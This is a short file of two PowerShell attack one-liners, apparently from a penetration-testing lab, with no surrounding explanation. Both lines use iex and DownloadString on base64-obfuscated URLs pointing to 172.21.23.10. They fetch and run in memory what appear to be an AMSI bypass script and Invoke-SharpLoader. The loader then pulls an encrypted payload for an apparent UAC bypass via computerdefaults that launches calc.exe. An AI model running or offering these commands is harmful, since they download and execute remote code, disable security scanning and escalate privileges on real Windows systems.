
iex(new-object net.webclient).DownloadString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADcAMgAuADIAMQAuADIAMwAuADEAMAAvAGEAbQBpAC4AdAB4AHQA'))))
iex(new-object net.webclient).DownloadString($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwAxADcAMgAuADIAMQAuADIAMwAuADEAMAAvAGkAbgB2AG8AawBlAC0AcwBoAGEAcgBwAGwAbwBhAGQAZQByAC4AcABzADEA'))));invoke-sharploader -location http://172.21.23.10/uac.enc -password password -argument computerdefaults -argument2 Y21kIC9jIHN0YXJ0IGNhbGMuZXhl
